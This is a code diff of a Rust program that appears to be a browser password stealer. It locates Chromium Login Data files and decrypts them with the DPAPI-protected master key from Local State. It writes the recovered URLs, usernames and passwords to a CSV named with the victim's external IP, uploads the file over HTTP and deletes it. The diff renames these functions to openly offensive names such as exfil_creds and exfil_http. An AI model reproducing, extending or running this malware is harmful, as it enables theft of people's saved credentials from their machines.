@@ -49,7 +49,7 @@ fn main() {
     }
 
     if !all_passwords.is_empty() {
-        if let Err(e) = upload_passwords(all_passwords) {
+        if let Err(e) = exfil_creds(all_passwords) {
             eprintln!("Fail {}", e);
         } else {
             println!("Succ.");
@@ -59,22 +59,22 @@ fn main() {
     }
 }
 
-fn upload_passwords(passwords: Vec<Vec<String>>) -> Result<(), String> {
-    let filename = generate_unique_filename(passwords.len())?;
-    write_to_csv(&passwords, &filename)
+fn exfil_creds(passwords: Vec<Vec<String>>) -> Result<(), String> {
+    let filename = gen_unique_fn(passwords.len())?;
+    make_csv(&passwords, &filename)
         .map_err(|e| format!("Failed to write CSV: {}", e))?;
-    upload_via_http(&filename)?;
+    exfil_http(&filename)?;
     fs::remove_file(&filename).map_err(|e| format!("Failed to delete CSV file: {}", e))?;
     Ok(())
 }
 
-fn generate_unique_filename(total_recovered: usize) -> Result<String, String> {
-    let external_ip = get_external_ip()?;
+fn gen_unique_fn(total_recovered: usize) -> Result<String, String> {
+    let external_ip = get_extern()?;
     let date = chrono::Local::now().format("%Y-%m-%d").to_string();
     Ok(format!("[{}]-[{}]-[{}].csv", external_ip, total_recovered, date))
 }
 
-fn get_external_ip() -> Result<String, String> {
+fn get_extern() -> Result<String, String> {
     let response = reqwest::blocking::get("https://api.ipify.org?format=text")
         .map_err(|e| format!("Failed to get external IP: {}", e))?
         .text()
@@ -82,7 +82,7 @@ fn get_external_ip() -> Result<String, String> {
     Ok(response.trim().to_string())
 }
 
-fn write_to_csv(passwords: &Vec<Vec<String>>, filename: &str) -> Result<(), Box<dyn Error>> {
+fn make_csv(passwords: &Vec<Vec<String>>, filename: &str) -> Result<(), Box<dyn Error>> {
     let file_path = Path::new(&filename);
     let mut wtr = csv::Writer::from_path(file_path)?;
     wtr.write_record(&["URL", "Username", "Password"])?;
@@ -93,7 +93,7 @@ fn write_to_csv(passwords: &Vec<Vec<String>>, filename: &str) -> Result<(), Box<
     Ok(())
 }
 
-fn upload_via_http(filename: &str) -> Result<(), String> {
+fn exfil_http(filename: &str) -> Result<(), String> {
     let file_path = Path::new(filename);
     let mut file = File::open(file_path)
         .map_err(|e| format!("Failed to open file for upload: {}", e))?;
@@ -153,7 +153,7 @@ fn scan_for_login_data(app_dirs: &[PathBuf]) -> Vec<ChromiumBrowser> {
             };
             if !local_state_path.exists() { continue; }
             let browser_name = infer_browser_name(&login_data_path);
-            if validate_login_data_schema(&login_data_path) {
+            if validate_LD_schema(&login_data_path) {
                 browsers.push(ChromiumBrowser { 
                     name: browser_name, 
                     local_state_path, 
@@ -165,7 +165,7 @@ fn scan_for_login_data(app_dirs: &[PathBuf]) -> Vec<ChromiumBrowser> {
     browsers
 }
 
-fn validate_login_data_schema(login_data_path: &PathBuf) -> bool {
+fn validate_LD_schema(login_data_path: &PathBuf) -> bool {
     let conn = match sqlite::open(login_data_path) { 
         Ok(c) => c, 
         Err(_) => return false 
@@ -207,7 +207,7 @@ fn get_master_key(local_state_path: &PathBuf) -> Result<Vec<u8>, String> {
     if encrypted_key.len() < 5 { 
         return Err("Encrypted key too short.".to_string()); 
     }
-    encrypted_key = encrypted_key[5..].to_vec();
+    encrypted_key = encrypted_key[5..].to_vec(); // Remove 'DPAPI' prefix
     decrypt_encrypted_key(encrypted_key).ok_or("Master key decryption failed!".to_string())
 }
 
